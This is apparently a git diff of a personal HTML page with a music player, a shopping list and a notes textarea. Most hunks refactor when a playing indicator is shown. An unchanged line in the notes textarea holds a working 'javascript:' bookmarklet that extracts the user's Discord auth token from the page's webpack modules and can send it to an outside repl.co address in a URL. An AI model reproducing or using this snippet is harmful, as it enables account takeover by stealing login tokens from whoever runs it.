@@ -51,20 +51,20 @@ html { scroll-behavior: smooth; }
 <img id="z" src="qr.png" width="80" height="80" style="position: absolute; top: 0px; left: 970px;">
 
 <div style="margin-top: 70px; display: grid; width: 120px;">
-<span onclick="play_music('yasashisa'); show_indicator('playing_indicator')">Yasashisa</span>
-<span onclick="play_music('kaerou'); show_indicator('playing_indicator')">Kaerou</span>
-<span onclick="play_music('shinunoga'); show_indicator('playing_indicator')">Shinunoga E-Wa</span>
-<span onclick="play_music('matsuri'); show_indicator('playing_indicator')">Matsuri</span>
-<span onclick="play_music('tsumi'); show_indicator('playing_indicator')">Tsumi No Kaori</span>
-<span onclick="play_music('night'); show_indicator('playing_indicator')">Night Dancer</span>
-<span onclick="play_music('lemon'); show_indicator('playing_indicator')">Lemon</span>
-<span onclick="play_music('metronome'); show_indicator('playing_indicator')">Metronome</span>
-<span onclick="play_music('loser'); show_indicator('playing_indicator')">Loser</span>
-<span onclick="play_music('shunrai'); show_indicator('playing_indicator')">Shunrai</span>
-<span onclick="play_music('uma'); show_indicator('playing_indicator')">Uma to Shika</span>
-<span onclick="play_music('orion'); show_indicator('playing_indicator')">Orion</span>
-<span onclick="play_music('eine'); show_indicator('playing_indicator')">Eine Kleine</span>
-<span onclick="play_music('haiiro'); show_indicator('playing_indicator')">Haiiro to Ao</span>
+<span onclick="play_music('yasashisa')">Yasashisa</span>
+<span onclick="play_music('kaerou')">Kaerou</span>
+<span onclick="play_music('shinunoga')">Shinunoga E-Wa</span>
+<span onclick="play_music('matsuri')">Matsuri</span>
+<span onclick="play_music('tsumi')">Tsumi No Kaori</span>
+<span onclick="play_music('night')">Night Dancer</span>
+<span onclick="play_music('lemon')">Lemon</span>
+<span onclick="play_music('metronome')">Metronome</span>
+<span onclick="play_music('loser')">Loser</span>
+<span onclick="play_music('shunrai')">Shunrai</span>
+<span onclick="play_music('uma')">Uma to Shika</span>
+<span onclick="play_music('orion')">Orion</span>
+<span onclick="play_music('eine')">Eine Kleine</span>
+<span onclick="play_music('haiiro')">Haiiro to Ao</span>
 <div id="list" style="margin-top: 20px;">
 <textarea class="auto_resize">SleepingPills Laudry Socks Supel Deodorant Sugar Wallet CookingOil Tissue Rice Toothbrush Wigs IceCreamCandy Makapuno EarphoneContainer EfficascentOil Perfume Briefcase SSS Metrobank</textarea>
 </div>
@@ -156,7 +156,7 @@ html { scroll-behavior: smooth; }
 
 <div id="files" style="position: absolute; top: 2400px;">
 <span id="user_ip"></span><span id="progress"></span><br>
-<textarea>client=~/client && rm -r ${client} && cd ~/storage/shared/download/client/ && cp index.html index.dll && cd .. && cp -r client ${client} && cd ${client} && vercel --prod -y
+<textarea>client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
 
@@ -1970,7 +1970,6 @@ download_bytes = 2750000
 
 window.addEventListener("load", () => {
 play_music(music_list[Math.floor(Math.random() * music_list.length)].name)
-show_indicator("playing_indicator")
 //user_ip.scrollIntoView({ behavior: 'smooth' })
 get_posts()
 })
@@ -2248,6 +2247,7 @@ last_music = ""
 function play_music(music) {
 if(music === last_music) return
 last_music = music
+show_indicator("playing_indicator")
 div = document.createElement("div")
 music_list.forEach(temp_music => {
 if(temp_music.name.toLowerCase().includes(music.toLowerCase())) {
@@ -2256,7 +2256,6 @@ audio_element(temp_music.src) } })
 music_position.replaceChildren(div)
 audio.onended = () => {
 play_music(music_list[Math.floor(Math.random() * music_list.length)].name)
-show_indicator("playing_indicator")
 audio.play() } }
 
 player_hotkeys = ["playing_indicator"]
